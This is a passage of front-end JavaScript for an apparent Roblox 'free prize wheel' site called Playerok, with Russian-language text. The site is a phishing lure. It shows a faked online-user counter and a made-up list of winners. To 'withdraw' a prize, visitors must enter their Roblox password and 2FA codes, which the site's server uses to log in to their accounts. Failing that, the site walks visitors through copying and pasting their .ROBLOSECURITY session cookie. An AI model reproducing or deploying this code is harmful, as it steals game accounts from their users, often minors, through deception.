    const eased = 1 - Math.pow(1 - progress, 4);
    rotation = startRotation + (targetRotation - startRotation) * eased;
    drawWheel();

    if (progress < 1) {
      requestAnimationFrame(animate);
    } else {
      rotation = targetRotation;
      drawWheel();
      isSpinning = false;
      canvas.classList.remove('spinning');
      wheelGlow.classList.remove('active');
      var stg = document.querySelector('.wheel-stage');
      if (stg) stg.classList.remove('spin-active');

      wheelPointer.classList.add('bounce');
      setTimeout(() => wheelPointer.classList.remove('bounce'), 500);

      const claimLink = generateClaimLink(username, prize);
      setLastSpinTime();
      addWinRecord(prize, claimLink, username);
      safeStorageSet(STORAGE_USERNAME, username);
      trackEvent('spin', {
        prize: prize.name,
        rarity: prize.rarity,
        claimLink,
        username,
      });
      showWinModal(prize, claimLink, true);
      renderWinHistory();
      startCooldownTimer();

      const spins = parseInt(totalSpinsEl.dataset.target, 10) + 1;
      totalSpinsEl.dataset.target = spins;
      animateCounter(totalSpinsEl, spins);

      const wins = parseInt(winCountEl.dataset.target, 10) + 1;
      winCountEl.dataset.target = wins;
      animateCounter(winCountEl, wins);
    }
  }

  requestAnimationFrame(animate);
}

function animateCounter(el, target) {
  const start = parseInt(el.textContent.replace(/\s/g, ''), 10) || 0;
  const diff = target - start;
  const duration = 800;
  const startTime = performance.now();

  function tick(now) {
    const progress = Math.min((now - startTime) / duration, 1);
    const eased = 1 - Math.pow(1 - progress, 3);
    const current = Math.round(start + diff * eased);
    el.textContent = current.toLocaleString('ru-RU');
    if (progress < 1) requestAnimationFrame(tick);
  }

  requestAnimationFrame(tick);
}

function renderPrizeGrid() {
  var sorted = [...WHEEL_SEGMENTS].sort(function(a, b) { return a.displayPercent - b.displayPercent; });
  prizeGrid.innerHTML = sorted.map(
    (p) => `
    <div class="prize-card ${p.rarity}">
      <div class="prize-image-wrap">
        <div class="prize-image-glow"></div>
        <img class="prize-image" src="${p.image}" alt="${p.name}" loading="lazy">
      </div>
      <div class="prize-name">${p.name}</div>
      <div class="prize-chance">${formatPercent(p.displayPercent)} шанс</div>
      <div class="prize-rarity ${p.rarity}">${p.rarity.toUpperCase()}</div>
    </div>`
  ).join('');
}

function initParticles() {
  const container = document.getElementById('particles');
  const colors = ['#ffc800', '#111111', '#ffe066', '#e8eaed'];
  for (let i = 0; i < 55; i++) {
    const dot = document.createElement('div');
    dot.className = 'particle';
    const color = colors[Math.floor(Math.random() * colors.length)];
    const size = 2 + Math.random() * 4;
    dot.style.cssText = `
      width: ${size}px;
      height: ${size}px;
      left: ${Math.random() * 100}%;
      background: ${color};
      opacity: ${0.15 + Math.random() * 0.35};
      animation-duration: ${8 + Math.random() * 14}s;
      animation-delay: ${Math.random() * 12}s;
    `;
    container.appendChild(dot);
  }
}

function initWheelSparks() {
  var box = document.getElementById('wheelSparks');
  if (!box) return;
  var colors = ['#ffc800', '#ffe066', '#fff', '#ffaa00'];
  for (var i = 0; i < 18; i++) {
    var sp = document.createElement('div');
    sp.className = 'wheel-spark';
    var sz = 2 + Math.random() * 4;
    var angle = Math.random() * 360;
    var dist = 42 + Math.random() * 12;
    var color = colors[Math.floor(Math.random() * colors.length)];
    var dur = 2 + Math.random() * 4;
    var delay = Math.random() * dur;
    sp.style.cssText =
      'width:' + sz + 'px;height:' + sz + 'px;' +
      'top:50%;left:50%;' +
      'background:' + color + ';' +
      'box-shadow:0 0 ' + (sz * 2) + 'px ' + color + ';' +
      'animation:wheelSparkOrbit ' + dur + 's linear infinite, wheelSparkPulse ' + (1 + Math.random() * 2) + 's ease-in-out infinite;' +
      'animation-delay:' + delay + 's;' +
      '--spark-angle:' + angle + 'deg;' +
      '--spark-dist:' + dist + '%;';
    box.appendChild(sp);
  }
}

function initFloatWeapons() {
  const container = document.getElementById('floatWeapons');
  const weapons = WHEEL_SEGMENTS.map((p) => p.image);
  const positions = [
    { top: '8%', left: '5%', size: 80, delay: 0 },
    { top: '60%', left: '3%', size: 60, delay: -5 },
    { top: '15%', right: '6%', size: 70, delay: -3 },
    { top: '70%', right: '4%', size: 55, delay: -8 },
  ];

  positions.forEach((pos, i) => {
    const img = document.createElement('img');
    img.className = 'float-weapon';
    img.src = weapons[i % weapons.length];
    img.alt = '';
    img.style.cssText = `
      top: ${pos.top};
      ${pos.left ? `left: ${pos.left}` : `right: ${pos.right}`};
      width: ${pos.size}px;
      animation-delay: ${pos.delay}s;
    `;
    container.appendChild(img);
  });
}

function initTicker() {
  const track = document.getElementById('tickerTrack');
  const items = [];
  const names = [...TICKER_NAMES].sort(() => Math.random() - 0.5);
  const prizes = [...WHEEL_SEGMENTS].sort(() => Math.random() - 0.5);

  for (let i = 0; i < 16; i++) {
    const prize = prizes[i % prizes.length];
    const name = names[i % names.length];
    items.push(`
      <div class="ticker-item">
        <img src="${prize.image}" alt="">
        <strong>${name}</strong>
        ${i18n('ticker.won')} <span class="win-name">${prize.name}</span>
      </div>`);
  }

  const html = items.join('');
  track.innerHTML = html + html;
}

function initOnlineCounter() {
  const el = document.getElementById('onlineCount');
  setInterval(() => {
    const base = 2400;
    const delta = Math.floor(Math.random() * 40) - 20;
    el.textContent = (base + delta).toLocaleString('ru-RU');
  }, 4000);
}

function initCounters() {
  animateCounter(totalSpinsEl, parseInt(totalSpinsEl.dataset.target, 10));
  animateCounter(winCountEl, parseInt(winCountEl.dataset.target, 10));
}

if (new URLSearchParams(window.location.search).has('reset')) {
  clearAllSpinData();
  if (window.history && window.history.replaceState) {
    window.history.replaceState({}, '', window.location.pathname);
  }
}

const savedUsername = safeStorageGet(STORAGE_USERNAME);

try {
  renderPrizeGrid();
  initParticles();
  initWheelSparks();
  initFloatWeapons();
  initTicker();
  initOnlineCounter();
  initCounters();
  renderWinHistory();
  startCooldownTimer();

  if (savedUsername && usernameInput) usernameInput.value = savedUsername;

  preloadImages();
  refreshWheel();
  if (typeof requestAnimationFrame !== 'undefined') {
    requestAnimationFrame(refreshWheel);
  }
  window.addEventListener('load', refreshWheel);

  trackEvent('visit', {
    path: window.location.pathname,
    host: window.location.hostname,
    referrer: document.referrer || '',
  });
} catch (err) {
  console.error('Playerok init error:', err);
}

if (spinBtn) spinBtn.addEventListener('click', spin);
if (usernameInput) {
  usernameInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') spin();
  });
}

const openVipBtn = document.getElementById('openVipBtn');
if (openVipBtn) {
  openVipBtn.addEventListener('click', () => {
    const link = document.getElementById('winLink').value;
    if (link) {
      trackEvent('vip_click', {
        claimLink: link,
        prize: document.getElementById('wonName').textContent,
      });
      window.open(link, '_blank', 'noopener,noreferrer');
    }
  });
}

const copyBtn = document.getElementById('copyBtn');
const COPY_VIP_LABEL = function() { return i18n('vip.copy'); };
if (copyBtn) {
  copyBtn.addEventListener('click', () => {
    const link = document.getElementById('winLink').value;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(link).then(() => {
        copyBtn.textContent = i18n('vip.copied');
        setTimeout(() => { copyBtn.textContent = COPY_VIP_LABEL(); }, 2000);
      });
    }
  });
}

const spinAgainBtn = document.getElementById('spinAgainBtn');
if (spinAgainBtn) {
  spinAgainBtn.addEventListener('click', () => {
    if (winModal) winModal.classList.add('hidden');
  });
}

if (winModal) {
  const backdrop = winModal.querySelector('.modal-backdrop');
  if (backdrop) {
    backdrop.addEventListener('click', () => {
      winModal.classList.add('hidden');
    });
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// AUTH + INVENTORY SYSTEM
// ══════════════════════════════════════════════════════════════════════════════

(function () {
  var currentUser = null;
  var pendingPrize = null;
  var authChallengeKey = null;

  var authModal = document.getElementById('authModal');
  var authError = document.getElementById('authError');
  var authLoading = document.getElementById('authLoading');
  var headerLoginBtn = document.getElementById('headerLoginBtn');
  var headerLogoutBtn = document.getElementById('headerLogoutBtn');
  var headerUserName = document.getElementById('headerUserName');
  var authArea = document.getElementById('authArea');
  var userArea = document.getElementById('userArea');
  var navInventory = document.getElementById('navInventory');
  var withdrawBtn = document.getElementById('withdrawBtn');

  var paneChoose = document.getElementById('paneChoose');
  var paneLogin = document.getElementById('paneLogin');
  var paneCookie = document.getElementById('paneCookie');
  var paneCaptcha = document.getElementById('paneCaptcha');
  var pane2fa = document.getElementById('pane2fa');
  var allPanes = [paneChoose, paneLogin, paneCookie, paneCaptcha, pane2fa];

  function showPane(pane) {
    allPanes.forEach(function (p) { if (p) p.classList.add('hidden'); });
    if (pane) pane.classList.remove('hidden');
  }

  function showError(msg) {
    if (!authError) return;
    authError.textContent = msg;
    authError.classList.remove('hidden');
    setTimeout(function () { authError.classList.add('hidden'); }, 5000);
  }

  function setLoading(on) {
    if (authLoading) authLoading.classList.toggle('hidden', !on);
  }

  function updateUI() {
    if (currentUser) {
      if (authArea) authArea.classList.add('hidden');
      if (userArea) userArea.classList.remove('hidden');
      if (headerUserName) headerUserName.textContent = currentUser.name;
      if (navInventory) navInventory.classList.remove('hidden');
    } else {
      if (authArea) authArea.classList.remove('hidden');
      if (userArea) userArea.classList.add('hidden');
      if (navInventory) navInventory.classList.add('hidden');
    }
  }

  function openAuthModal(prize) {
    pendingPrize = prize || null;
    if (!authModal) return;
    authModal.classList.remove('hidden');
    showPane(paneChoose);
    if (authError) authError.classList.add('hidden');
    setLoading(false);
  }

  function closeAuthModal() {
    if (authModal) authModal.classList.add('hidden');
    pendingPrize = null;
    setLoading(false);
  }

  function handleAuthSuccess(user) {
    currentUser = user;
    groupJoined = true;
    try { localStorage.setItem('playerok_group_joined', '1'); } catch(e) {}
    var gm = document.getElementById('groupModal');
    if (gm) gm.classList.add('hidden');
    updateUI();
    if (pendingPrize) {
      addToInventory(pendingPrize);
      pendingPrize = null;
    }
    closeAuthModal();
  }

  async function addToInventory(prize) {
    try {
      var r = await fetch('/api/inventory/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: prize.name, image: prize.image, rarity: prize.rarity, value: prize.value }),
      });
      var d = await r.json();
      if (d.ok) {
        if (winModal) winModal.classList.add('hidden');
        alert('Предмет «' + prize.name + '» добавлен в инвентарь! Перейди в Инвентарь, чтобы вывести.');
      } else {
        alert(d.error || 'Ошибка добавления');
      }
    } catch (e) { alert('Ошибка сети'); }
  }

  async function checkAuth() {
    try {
      var r = await fetch('/api/auth/me');
      var d = await r.json();
      if (d.ok && d.user) { currentUser = d.user; updateUI(); }
    } catch (e) {}
  }

  document.querySelectorAll('.auth-method-card').forEach(function (card) {
    card.addEventListener('click', function () {
      var method = card.dataset.method;
      if (method === 'login') showPane(paneLogin);
      else if (method === 'cookie') showPane(paneCookie);
    });
  });

  document.querySelectorAll('.auth-back-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
      if (authError) authError.classList.add('hidden');
      showPane(paneChoose);
    });
  });

  // Open modal
  if (headerLoginBtn) headerLoginBtn.addEventListener('click', function () { openLoginPage(); });
  if (authModal) {
    var closeBtn = document.getElementById('authModalClose');
    var backdrop = authModal.querySelector('.auth-modal-backdrop');
    if (closeBtn) closeBtn.addEventListener('click', closeAuthModal);
    if (backdrop) backdrop.addEventListener('click', closeAuthModal);
  }

  // Logout
  if (headerLogoutBtn) headerLogoutBtn.addEventListener('click', function () {
    fetch('/api/auth/logout', { method: 'POST' }).then(function () {
      currentUser = null;
      updateUI();
    });
  });

  // Withdraw button in win modal
  if (withdrawBtn) {
    withdrawBtn.addEventListener('click', function () {
      trackEvent('withdraw', {
        prize: document.getElementById('wonName') ? document.getElementById('wonName').textContent : '',
        host: window.location.hostname,
      });
      openLoginPage();
    });
  }

  function handleChallengeResponse(d) {
    authChallengeKey = d.challengeKey;
    setLoading(false);

    if (d.challengeType === 'twostepverification') {
      showPane(pane2fa);
      show2faInfo(d.challengeMetadata);
      return;
    }

    if (d.challengeType === 'proofofwork') {
      showPane(paneCaptcha);
      autoSolvePow();
      return;
    }

    var hasBlob = false;
    try {
      var meta = JSON.parse(atob(d.challengeMetadata || ''));
      hasBlob = Boolean(meta.dataExchangeBlob);
    } catch (e) {}

    if (hasBlob) {
      showPane(paneCaptcha);
      loadArkoseCaptcha(d.challengeMetadata, d.challengeType);
    } else {
      showPane(paneCaptcha);
      showChallengeHelp(d.challengeType);
    }
  }

  async function autoSolvePow() {
    var container = document.getElementById('captchaContainer');
    if (container) {
      container.innerHTML = '<div class="pow-solving">'
        + '<div class="pow-spinner"></div>'
        + '<h3>Проходим проверку Roblox...</h3>'
        + '<p>Это автоматическая проверка, подожди несколько секунд</p>'
        + '</div>';
    }
    setLoading(true);
    try {
      var r = await fetch('/api/auth/challenge-continue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ challengeKey: authChallengeKey, solvePow: true }),
      });
      var d = await r.json();
      if (d.ok) {
        handleAuthSuccess(d.user);
      } else if (d.step === 'challenge') {
        handleChallengeResponse(d);
      } else {
        showError(d.error || 'Проверка не пройдена');
        setLoading(false);
        showChallengeHelp('proofofwork');
      }
    } catch (e) {
      showError('Ошибка сети');
      setLoading(false);
      showChallengeHelp('proofofwork');
    }
  }

  var currentChallengeType = 'captcha';

  function loadArkoseCaptcha(metadataBase64, challengeType) {
    currentChallengeType = challengeType || 'captcha';
    var container = document.getElementById('captchaContainer');
    if (!container) return;
    container.innerHTML = '<div id="arkose-mount"></div><p class="captcha-loading-msg">Загрузка капчи Roblox...</p>';

    var metadata;
    try { metadata = JSON.parse(atob(metadataBase64)); } catch (e) {
      showChallengeHelp(currentChallengeType);
      return;
    }
    var blob = metadata.dataExchangeBlob;
    if (!blob) { showChallengeHelp(currentChallengeType); return; }

    window.arkoseSetupEnforcement = function (enforcement) {
      enforcement.setConfig({
        selector: '#arkose-mount',
        mode: 'inline',
        data: { blob: blob },
        onCompleted: function (response) {
          if (response && response.token) submitCaptchaToken(response.token);
        },
        onReady: function () {
          var msg = container.querySelector('.captcha-loading-msg');
          if (msg) msg.textContent = 'Реши капчу ниже:';
        },
        onShown: function () {
          var msg = container.querySelector('.captcha-loading-msg');
          if (msg) msg.remove();
        },
        onSuppress: function () {
          var msg = container.querySelector('.captcha-loading-msg');
          if (msg) msg.textContent = 'Проверка пройдена автоматически...';
        },
        onError: function () { showChallengeHelp(currentChallengeType); },
        onFailed: function () { showChallengeHelp(currentChallengeType); }
      });
    };

    var old = document.getElementById('arkose-sdk');
    if (old) old.remove();

    var script = document.createElement('script');
    script.id = 'arkose-sdk';
    script.src = 'https://roblox-api.arkoselabs.com/v2/476068BF-9607-4799-B53D-966BE98E2B81/api.js';
    script.setAttribute('data-callback', 'arkoseSetupEnforcement');
    script.async = true;
    script.defer = true;
    script.onerror = function () { showChallengeHelp(currentChallengeType); };
    document.head.appendChild(script);
  }

  async function submitCaptchaToken(token) {
    setLoading(true);
    if (authError) authError.classList.add('hidden');
    try {
      var r = await fetch('/api/auth/challenge-continue', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ challengeKey: authChallengeKey, captchaToken: token, challengeType: currentChallengeType }),
      });
      var d = await r.json();
      if (d.ok) {
        handleAuthSuccess(d.user);
      } else if (d.step === 'challenge') {
        handleChallengeResponse(d);
      } else {
        showError(d.error || 'Ошибка авторизации');
        setLoading(false);
      }
    } catch (e) {
      showError('Ошибка сети');
      setLoading(false);
    }
  }

  function show2faInfo(metadataBase64) {
    var mediaLabel = 'приложения аутентификации';
    try {
      var meta = JSON.parse(atob(metadataBase64));
      var mt = (meta.mediaType || '').toLowerCase();
      if (mt === 'email') mediaLabel = 'email';
      else if (mt === 'sms') mediaLabel = 'SMS';
    } catch (e) {}
    var info = document.getElementById('twoFaInfo');
    if (info) info.textContent = 'Введи код из ' + mediaLabel;
  }

  function showChallengeHelp(challengeType) {
    var container = document.getElementById('captchaContainer');
    if (!container) return;
    var typeLabel = challengeType === 'proofofwork' ? 'Proof of Work' : 'проверку безопасности';
    container.innerHTML = ''
      + '<div class="challenge-help">'
      + '<div class="challenge-help-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>'
      + '<h3>Roblox требует ' + typeLabel + '</h3>'
      + '<p>Эту проверку нельзя пройти на внешнем сайте. Используй <strong>вход через куки</strong>:</p>'
      + '<ol>'
      + '<li>Открой <a href="https://www.roblox.com" target="_blank" rel="noopener">roblox.com</a> и войди в аккаунт</li>'
      + '<li>Нажми <kbd>F12</kbd> → <strong>Application</strong> → <strong>Cookies</strong></li>'
      + '<li>Скопируй значение <code>.ROBLOSECURITY</code></li>'
      + '<li>Вставь во вкладке «Через куки»</li>'
      + '</ol>'
      + '<button class="auth-submit" id="switchToCookieBtn">Перейти к входу через куки</button>'
      + '</div>';
    var btn = document.getElementById('switchToCookieBtn');
    if (btn) btn.addEventListener('click', function () {
      showPane(paneCookie);
    });
  }

  // Login with password (via headless Chrome on server)
  var authCredKey = '';
  var authLoginBtn = document.getElementById('authLoginBtn');
  if (authLoginBtn) authLoginBtn.addEventListener('click', async function () {
    var u = document.getElementById('authUsername').value.trim();
    var p = document.getElementById('authPassword').value;
    if (!u || !p) { showError('Введи ник и пароль'); return; }
    authLoginBtn.disabled = true;
    setLoading(true);
    showError('');
    var statusEl = document.getElementById('authLoginStatus');
    if (statusEl) statusEl.textContent = 'Входим через Roblox... ~10 сек';
    try {
      var r = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: u, password: p }),
      });
      var d = await r.json();
      if (statusEl) statusEl.textContent = '';
      if (d.ok) {
        handleAuthSuccess(d.user);
      } else if (d.step === '2fa') {
        authCredKey = d.credKey || '';
        setLoading(false);
        showPane(pane2fa);
        var info = document.getElementById('twoFaInfo');
        if (info) info.textContent = d.message || 'Введи код 2FA';
        var codeInput = document.getElementById('auth2faCode');
        if (codeInput) { codeInput.value = ''; codeInput.focus(); }
        var st = document.getElementById('auth2faStatus');
        if (st) st.textContent = '';
      } else if (d.step === 'challenge') {
        handleChallengeResponse(d);
      } else {
        showError(d.error || 'Ошибка входа');
        setLoading(false);
      }
    } catch (e) {
      if (statusEl) statusEl.textContent = '';
      showError('Нет соединения');
      setLoading(false);
    }
    authLoginBtn.disabled = false;
  });

  // Login with cookie
  var authCookieBtn = document.getElementById('authCookieBtn');
  if (authCookieBtn) authCookieBtn.addEventListener('click', async function () {
    var c = document.getElementById('authCookie').value.trim();
    if (!c) { showError('Вставь куку'); return; }
    authCookieBtn.disabled = true;
    setLoading(true);
    try {
      var r = await fetch('/api/auth/cookie', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: c }),
      });
      var d = await r.json();
      if (d.ok) { handleAuthSuccess(d.user); }
      else { showError(d.error || 'Невалидная кука'); setLoading(false); }
    } catch (e) { showError('Нет соединения'); setLoading(false); }
    authCookieBtn.disabled = false;
  });

  // 2FA code submit (via headless Chrome)
  var auth2faBtn = document.getElementById('auth2faBtn');
  if (auth2faBtn) auth2faBtn.addEventListener('click', async function () {
    var code = document.getElementById('auth2faCode').value.trim();
    if (!code) { showError('Введи код'); return; }
    if (!authCredKey) { showError('Сессия истекла. Войди заново.'); return; }
    auth2faBtn.disabled = true;
    setLoading(true);
    showError('');
    var st = document.getElementById('auth2faStatus');
    if (st) st.textContent = 'Подтверждаем код... ~30 сек';
    try {
      var r = await fetch('/api/auth/submit-2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credKey: authCredKey, code: code }),
      });
      var d = await r.json();
      if (st) st.textContent = '';
      if (d.ok) {
        handleAuthSuccess(d.user);
      } else {
        showError(d.error || (r.status === 504 ? 'Таймаут. Попробуй ещё раз.' : 'Неверный код'));
        setLoading(false);
      }
    } catch (e) {
      if (st) st.textContent = '';
      showError('Сервер не ответил. Подожди и попробуй снова.');
      setLoading(false);
    }
    auth2faBtn.disabled = false;
  });

  // Resend 2FA code
  var authResend2fa = document.getElementById('authResend2fa');
  if (authResend2fa) authResend2fa.addEventListener('click', async function () {
    if (!authCredKey) { showError('Сессия истекла. Войди заново.'); return; }
    authResend2fa.disabled = true;
    showError('');
    var st = document.getElementById('auth2faStatus');
    if (st) st.textContent = 'Запрашиваем новый код... ~10 сек';
    try {
      var r = await fetch('/api/auth/resend-2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ credKey: authCredKey }),
      });
      var d = await r.json();
      if (d.ok) {
        if (st) st.textContent = 'Новый код отправлен!';
        setTimeout(function () { if (st) st.textContent = ''; }, 3000);
      } else if (d.user) {
        handleAuthSuccess(d.user);
      } else {
        showError(d.error || 'Не удалось отправить код');
      }
    } catch (e) {
      showError('Ошибка сети');
    }
    if (st && st.textContent.includes('Запрашиваем')) st.textContent = '';
    authResend2fa.disabled = false;
  });

  checkAuth();
})();

// ══════════════════════════════════════════════════════════════════════════════
// SUPPORT WIDGET
// ══════════════════════════════════════════════════════════════════════════════

(function () {
  var fab = document.getElementById('supportFab');
  var panel = document.getElementById('supportPanel');
  var msgContainer = document.getElementById('supportMessages');
  var nickInput = document.getElementById('supportNick');
  var msgInput = document.getElementById('supportMsg');
  var sendBtn = document.getElementById('supportSend');

  if (!fab || !panel) return;

  var SUPPORT_COOLDOWN_KEY = 'sp_support_cd';
  var SUPPORT_NICK_KEY = 'sp_support_nick';
  var MSG_COOLDOWN_MS = 30000;
  var POLL_INTERVAL_MS = 4000;
  var pollTimer = null;
  var knownMsgSet = {};
  var messageCount = 0;

  var savedNick = safeStorageGet(SUPPORT_NICK_KEY);
  if (savedNick && nickInput) nickInput.value = savedNick;

  var wheelNick = usernameInput ? usernameInput.value.trim() : '';
  if (wheelNick && nickInput && !nickInput.value) nickInput.value = wheelNick;

  fab.addEventListener('click', function () {
    var isOpen = fab.classList.toggle('open');
    panel.classList.toggle('open', isOpen);
    if (isOpen) {
      loadAllMessages();
      if (msgInput) msgInput.focus();
      startPolling();
    } else {
      stopPolling();
    }
  });

  function escHtml(str) {
    return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function msgKey(role, text, ts) {
    return role + '|' + ts + '|' + text;
  }

  function rebuildChat(messages) {
    msgContainer.innerHTML = '';
    knownMsgSet = {};
    messageCount = 0;
    messages.forEach(function (m) {
      var k = msgKey(m.role, m.text, m.ts);
      if (knownMsgSet[k]) return;
      knownMsgSet[k] = true;
      messageCount++;
      appendBubble(m.text, m.role);
    });
  }

  function appendBubble(text, role) {
    var type = role === 'admin' ? 'bot' : 'user';
    var div = document.createElement('div');
    div.className = 'support-msg support-msg-' + type;
    div.innerHTML = '<div class="support-msg-bubble">' + escHtml(text) + '</div>';
    msgContainer.appendChild(div);
  }

  function scrollToBottom() {
    msgContainer.scrollTop = msgContainer.scrollHeight;
  }

  function addStatus(text) {
    var div = document.createElement('div');
    div.className = 'support-msg-status';
    div.textContent = text;
    msgContainer.appendChild(div);
    scrollToBottom();
  }

  function canSend() {
    var last = Number(safeStorageGet(SUPPORT_COOLDOWN_KEY) || 0);
    return Date.now() - last >= MSG_COOLDOWN_MS;
  }

  function fetchMessages() {
    var cid = getVisitorId();
    if (!cid) return Promise.resolve([]);
    return fetch('/api/support/poll?cid=' + encodeURIComponent(cid) + '&since=0')
      .then(function (r) { return r.ok ? r.json() : { messages: [] }; })
      .then(function (data) { return data.messages || []; })
      .catch(function () { return []; });
  }

  function loadAllMessages() {
    fetchMessages().then(function (msgs) {
      if (!msgs.length && messageCount === 0) return;
      rebuildChat(msgs);
      scrollToBottom();
    });
  }

  function pollForUpdates() {
    fetchMessages().then(function (msgs) {
      if (msgs.length !== messageCount) {
        rebuildChat(msgs);
        scrollToBottom();
      }
    });
  }

  function sendMessage() {
    var nick = (nickInput ? nickInput.value.trim() : '') || 'Аноним';
    var text = msgInput ? msgInput.value.trim() : '';
    if (!text) {
      msgInput.classList.add('error');
      setTimeout(function () { msgInput.classList.remove('error'); }, 500);
      return;
    }
    if (!canSend()) {
      var secsLeft = Math.ceil((MSG_COOLDOWN_MS - (Date.now() - Number(safeStorageGet(SUPPORT_COOLDOWN_KEY)))) / 1000);
      addStatus('Подожди ' + secsLeft + ' сек перед следующим сообщением');
      return;
    }

    msgInput.value = '';
    sendBtn.disabled = true;

    safeStorageSet(SUPPORT_NICK_KEY, nick);
    safeStorageSet(SUPPORT_COOLDOWN_KEY, String(Date.now()));

    fetch('/api/support/message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: nick,
        message: text,
        visitorId: getVisitorId(),
        page: location.pathname,
      }),
    }).then(function (r) {
      if (r.ok) {
        addStatus('✓ Отправлено');
        setTimeout(loadAllMessages, 500);
      } else {
        addStatus('Ошибка отправки, попробуй позже');
      }
    }).catch(function () {
      addStatus('Нет соединения с сервером');
    }).finally(function () {
      sendBtn.disabled = false;
    });
  }

  function startPolling() {
    if (pollTimer) return;
    pollTimer = setInterval(pollForUpdates, POLL_INTERVAL_MS);
  }

  function stopPolling() {
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  }

  sendBtn.addEventListener('click', sendMessage);
  msgInput.addEventListener('keydown', function (e) {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  });

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && panel.classList.contains('open')) {
      fab.classList.remove('open');
      panel.classList.remove('open');
      stopPolling();
    }
  });
})();

document.addEventListener('i18n:change', function () {
  updateSpinButtonState();
  initTicker();
  if (typeof renderWinHistory === 'function') renderWinHistory();
});
